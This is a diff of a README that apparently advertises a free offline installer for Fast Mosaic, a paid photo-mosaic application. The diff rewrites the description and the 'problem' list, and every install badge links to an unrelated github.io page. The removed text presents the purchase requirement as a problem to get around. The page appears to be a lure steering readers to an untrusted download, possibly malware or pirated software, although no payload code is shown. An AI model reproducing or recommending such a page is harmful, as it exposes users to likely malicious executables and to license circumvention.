@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Photo+Mosaic-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Fast Mosaic Free Installer** — Fast Mosaic is a photo mosaic creation software for Windows and macOS that assembles thousands of small photos into a large mosaic image that resembles a target photograph. Works without internet access, no account required. Full offline installation.
+**💻 Fast Mosaic Free Installer** — Fast Mosaic is a Windows application for creating photo mosaic artworks where a large image is composed of hundreds of smaller photos. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast%20Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast+Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Fast Mosaic
 
-Fast Mosaic is a photo mosaic creation software for Windows and macOS that assembles thousands of small photos into a large mosaic image that resembles a target photograph. Supports customizable tile sizes, color matching, and high-resolution output.
+Fast Mosaic is a Windows application for creating photo mosaic artworks where a large image is composed of hundreds of smaller photos. Import your photo library as tile images, select a target image, and Fast Mosaic automatically arranges the tiles to recreate the target as a mosaic. Export high-resolution results for printing or digital display.
 
 ---
 
 ## ❌ Problem: Fast Mosaic is hard to access
 
-- **Paid License** — Requires purchase
-- **Photo Library Required** — Quality output requires hundreds or thousands of source photos
-- **Processing Time** — Creating high-resolution mosaics from large libraries takes significant time
-- **Single Use Case** — Very specific functionality with limited everyday utility
+- **Windows Only** — No macOS version
+- **Photo Library Size** — Better mosaics require large collections of varied tile photos
+- **Processing Time** — Large, high-resolution mosaics can take significant processing time
+- **Storage Requirements** — High-resolution exports can be very large files
 
 ---
 
@@ -81,7 +81,7 @@ Fast Mosaic is a photo mosaic creation software for Windows and macOS that assem
 
 <div align="center">
 
-[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast%20Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast+Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Fast Mosaic is a photo mosaic creation software for Windows and macOS that assem
 
 ---
 
-**Fast Mosaic Free Installer** — Fast Mosaic is a photo mosaic creation software for Windows and macOS that assembles thousands of small photos into a large mosaic image that resembles a target photograph. Install without internet connection today!
+**Fast Mosaic Free Installer** — Fast Mosaic is a Windows application for creating photo mosaic artworks where a large image is composed of hundreds of smaller photos. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast%20Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fast Mosaic](https://img.shields.io/badge/⬇_Install_Fast+Mosaic-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
